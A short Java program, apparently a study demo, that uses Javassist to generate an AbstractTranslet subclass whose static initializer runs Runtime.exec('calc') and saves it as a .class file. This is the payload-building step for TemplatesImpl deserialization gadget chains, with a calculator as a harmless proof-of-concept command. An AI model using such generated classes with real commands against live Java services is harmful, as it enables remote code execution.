package Seri.JavaAssistDemo;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import javassist.*;

import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.ByteBuffer;
import java.nio.channels.FileChannel;

public class GenerateShellClass {
    public static void main(String[] args) throws CannotCompileException, NotFoundException, IOException {
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass ctClass = pool.makeClass("ShellClass");
        String cmd = "java.lang.Runtime.getRuntime().exec(\"calc\");";
        ctClass.makeClassInitializer().insertBefore(cmd);
        ctClass.setName("ShellClassExec");
        ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));

        byte[] classBytes = ctClass.toBytecode();
        ByteBuffer bf = ByteBuffer.wrap(classBytes);

        FileChannel fc = new FileOutputStream("/Users/y1shin/IdeaProjects/Seri/target/classes/Seri/JavaAssistDemo/ShellClassExec.class").getChannel();
        fc.write(bf);
        fc.close();
    }
}
